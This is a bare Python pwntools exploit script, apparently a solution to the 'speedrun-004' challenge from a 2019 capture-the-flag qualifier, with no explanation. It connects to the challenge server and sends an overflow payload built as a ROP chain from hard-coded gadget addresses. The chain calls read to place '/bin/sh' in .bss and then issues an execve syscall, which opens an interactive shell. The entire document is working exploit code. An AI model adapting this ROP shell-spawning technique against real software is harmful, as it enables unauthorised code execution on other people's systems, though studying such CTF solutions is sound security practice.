from pwn import *
from time import sleep

context.log_level = 'debug'
context.arch = 'amd64'
r = remote('speedrun-004.quals2019.oooverflow.io', 31337)

bss = 0x6bba00
read = 0x44a140

#0x0000000000400686 : pop rdi ; ret
gg1 = 0x0000000000400686
#0x000000000044c6d9 : pop rdx ; pop rsi ; ret
gg2 = 0x000000000044c6d9
#0x0000000000415f04 : pop rax ; ret
gg3 = 0x0000000000415f04
#0x0000000000474f15 : syscall ; ret
gg4 = 0x0000000000474f15

r.recvuntil('?\n')
r.sendline(str(0x101))

p = ''
p += flat(
	gg1,
	0,
	gg2,
	8,
	bss,
	read
)
p += flat(
	gg1,
	bss,
	gg2,
	0,
	0,
	gg3,
	59,
	gg4
)
p = 'a'* 8 + (((0x100-len(p))/16)-1) * flat(gg1,0) + p + 'a' * 8 + '\x00'
	
r.recvuntil('?\n')
r.send(p)
r.recvuntil('\n')

sleep(0.3)
r.send('/bin/sh\x00')
r.interactive()
